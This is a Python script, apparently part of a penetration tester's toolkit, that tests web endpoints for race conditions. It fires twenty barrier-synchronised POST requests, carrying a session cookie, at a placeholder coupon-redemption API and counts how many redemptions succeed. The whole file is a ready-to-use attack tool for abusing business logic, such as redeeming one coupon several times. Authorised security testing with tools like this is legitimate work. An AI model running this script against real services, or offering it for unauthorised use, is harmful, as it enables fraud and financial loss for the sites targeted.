#!/usr/bin/env python3
"""
Race condition tester — sends N truly parallel requests using threading.
More precise than xargs because all threads launch from the same point in time.

Usage: python3 race-condition.py
Configure TARGET, HOST, METHOD, DATA, THREADS, EXPECTED_WIN below.
"""

import threading
import urllib.request
import urllib.parse
import time

# ── Configure these for each engagement ──────────────────────────────────────
TARGET  = "http://TARGET_IP/api/redeem"
HOST    = "target.com"
METHOD  = "POST"
THREADS = 20

# POST body (for GET targets, set DATA = None and encode params in TARGET url)
DATA = urllib.parse.urlencode({
    "coupon": "SAVE50",
    "action": "redeem",
}).encode()

HEADERS = {
    "Host": HOST,
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "session=VALID_SESSION_COOKIE",
    "User-Agent": "Mozilla/5.0",
}

# String in response body that indicates success (race win)
EXPECTED_WIN = "redeemed"
# ─────────────────────────────────────────────────────────────────────────────

results = []
lock = threading.Lock()
gate = threading.Barrier(THREADS)  # all threads start at same instant


def fire(i):
    gate.wait()  # block until all threads are ready, then release simultaneously
    req = urllib.request.Request(TARGET, data=DATA, headers=HEADERS, method=METHOD)
    start = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=15)
        body = r.read().decode(errors="replace")
        elapsed = time.time() - start
        won = EXPECTED_WIN.lower() in body.lower()
        with lock:
            results.append({"thread": i, "status": r.status, "won": won,
                             "elapsed": f"{elapsed:.3f}s", "body": body[:100]})
    except urllib.error.HTTPError as e:
        with lock:
            results.append({"thread": i, "status": e.code, "won": False,
                             "elapsed": "err", "body": str(e)})
    except Exception as e:
        with lock:
            results.append({"thread": i, "status": 0, "won": False,
                             "elapsed": "err", "body": str(e)[:80]})


def main():
    print(f"[*] Firing {THREADS} parallel requests at {TARGET}")
    print(f"[*] Win condition: response contains '{EXPECTED_WIN}'")
    print()

    threads = [threading.Thread(target=fire, args=(i,)) for i in range(THREADS)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    wins = [r for r in results if r["won"]]
    print(f"Results: {len(results)} responses | {len(wins)} wins")
    print()
    for r in sorted(results, key=lambda x: x["thread"]):
        tag = "WIN " if r["won"] else "    "
        print(f"  {tag}Thread {r['thread']:2d}: HTTP {r['status']} | {r['elapsed']} | {r['body'][:60]}")

    if len(wins) > 1:
        print(f"\n[!] RACE CONDITION CONFIRMED — {len(wins)} requests succeeded")
    elif len(wins) == 1:
        print("\n[~] Only 1 win — expected behaviour; increase threads or try again")
    else:
        print("\n[-] No wins — endpoint may be atomic or condition not met")


if __name__ == "__main__":
    main()
